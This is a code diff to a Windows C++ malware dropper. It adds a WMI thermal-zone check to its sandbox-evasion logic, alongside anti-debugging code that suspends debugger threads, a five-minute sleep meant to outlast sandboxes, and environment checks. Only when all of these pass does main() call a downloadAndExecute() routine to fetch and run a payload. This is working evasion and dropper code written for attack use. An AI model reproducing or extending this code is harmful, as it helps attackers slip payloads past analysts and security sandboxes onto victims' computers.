@@ -5,6 +5,7 @@
 /   TODO: implement common sandbox evasion techniques.
 /   ADDED: memory checker, Windows DC check, IP address checker, sleep timer.
 /   ADDED: very basic anti-debugging functionality.
+/   ADDED: check presence of thermal zone(s).
 /
 ************************************************************************/
 #include <iostream>
@@ -16,8 +17,11 @@
 #include <wchar.h>
 #include <cstdio>
 #include <lm.h>
+#include <wbemidl.h>
+#include <combaseapi.h>
 #include <DsGetDC.h>
 #pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "wbemuuid.lib")
 
 using namespace std;
 
@@ -81,15 +85,14 @@ DWORD IsDebuggerProcess(DWORD dwProcessId)
     return g_dwDebuggerProcessId == dwProcessId;
 }
 
-DWORD SuspendDebuggerThread()
-{
+DWORD SuspendDebuggerThread() {
     // Use SuspendThread() to suspend the running debugger, ruining someones day.
     // Sadly this can be patched quick&dirty by changing any SuspendThread() calls to 0x90h (NOP) instructions.
 	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE)
 	{
-        printf("Failed to create snapshot\n");
-        return 1;
+        printf("[INFO] Failed to create snapshot.\n");
+        return true;
     }
 
     THREADENTRY32 te32;
@@ -97,9 +100,9 @@ DWORD SuspendDebuggerThread()
 
     if (!Thread32First(hSnapshot, &te32))
 	{
-        printf("Failed to get first thread\n");
+        printf("[INFO] Failed to get first thread.\n");
         CloseHandle(hSnapshot);
-        return 1;
+        return true;
     }
 
     do
@@ -111,11 +114,11 @@ DWORD SuspendDebuggerThread()
 			if ( IsDebuggerProcess(dwProcessId) )
 			{
                 // Remove this from production code.
-				printf("[INFO] We have Debugger with pid %i! Suspending!\n", dwProcessId);
+				printf("[INFO] Found a Debugger with pid %i! Suspending!\n", dwProcessId);
 				DWORD result = SuspendThread(hThread);
  				if ( result == -1 )
 				{
-					printf("Last error: %i\n", GetLastError());
+					printf("[ERROR] Uups, something went wrong: %i\n", GetLastError());
 				}
 			}
             CloseHandle(hThread);
@@ -124,7 +127,7 @@ DWORD SuspendDebuggerThread()
 
     CloseHandle(hSnapshot);
 
-    return 0;
+    return false;
 }
 
 bool isDomainController() {
@@ -142,6 +145,55 @@ bool isDomainController() {
     else {
         return true;
     }
+}
+
+bool hasThermalZoneTemp() {
+    // Check if we can find a thermal zone that's returning sane values...
+    // Mind, this is not conclusive, even bare metal installations can have no thermal zones,
+    // so just use this in conjunction with other indicators to harden the evidence.
+	IWbemLocator* pLoc = NULL;
+	IWbemServices* pSvc = NULL;
+	IEnumWbemClassObject* pEnumerator = NULL;
+	IWbemClassObject* pclsObj = (IWbemClassObject*)malloc(sizeof(IWbemClassObject));
+	
+	ULONG uReturn = 0;
+
+	HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);
+	hr = CoInitializeSecurity(NULL, -1,	NULL, NULL,	RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE,	NULL, EOAC_NONE, NULL);
+	hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
+	hr = pLoc->ConnectServer(L"root\\wmi", NULL, NULL, 0, NULL,	0, 0, &pSvc);
+	hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT,	RPC_C_AUTHZ_NONE, NULL,	RPC_C_AUTHN_LEVEL_CALL,	RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
+	hr = pSvc->ExecQuery(L"WQL", L"SELECT * FROM MSAcpi_ThermalZoneTemperature", WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,	NULL, &pEnumerator);
+
+	while (pEnumerator)
+	{
+		hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
+		if (uReturn == 0)
+		{
+			return false;
+		}
+
+		VARIANT vtProp;
+
+		hr = pclsObj->Get(L"CurrentTemperature", 0, &vtProp, 0, 0);
+		if (SUCCEEDED(hr))
+		{
+            // Remove debug statement from production code:
+			printf("[INFO] Current Thermal Zone Temperature found: %d\n", vtProp.intVal);
+			return true;
+		}
+
+		VariantClear(&vtProp);
+		pclsObj->Release();
+	}
+
+	pEnumerator->Release();
+	pSvc->Release();
+	pLoc->Release();
+	
+	CoUninitialize();
+
+    return false;
 }
 
 bool checkIP() {
@@ -208,14 +260,14 @@ int downloadAndExecute() {
 }
 
 int main() {
-    // Look for debugger and SuspendThread() it...
+    // Look for debugger and SuspendThread() it if present...
     SuspendDebuggerThread();
 
     // Try to sleep through sandbox...
     sleep(300); // sleep_timer in seconds, about 5 min should be realistic tho...
     
     // Only drop and run our payload if we are not sandboxed (-anymore-)...
-    if ((memoryCheck() == true) && (isDomainController() == true) && (checkIP() == true)) {
+    if ((memoryCheck() == true) && (isDomainController() == true) && (checkIP() == true) && (hasThermalZoneTemp() == true)) {
         downloadAndExecute();
     }
     else {
